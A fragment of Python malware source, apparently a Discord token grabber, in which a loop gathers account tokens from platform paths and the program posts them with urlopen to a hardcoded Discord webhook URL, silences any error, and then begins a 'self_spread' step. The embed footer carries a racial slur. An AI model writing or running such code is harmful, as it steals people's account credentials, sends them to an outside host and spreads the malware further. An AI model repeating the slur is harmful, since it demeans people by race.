...
def main():
    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            embed = {
                ...
                "footer": {
                    "text": f"Token grabber by a nigger hater"
                }
            }
            embeds.append(embed)
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/848403293662740510/F5XHCl-xflY2qJ7O3UrDKzZGAzmMCnPhMWY4EyC9n3yDcCnEAlzN-yqKzEbQVwroWHf8", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
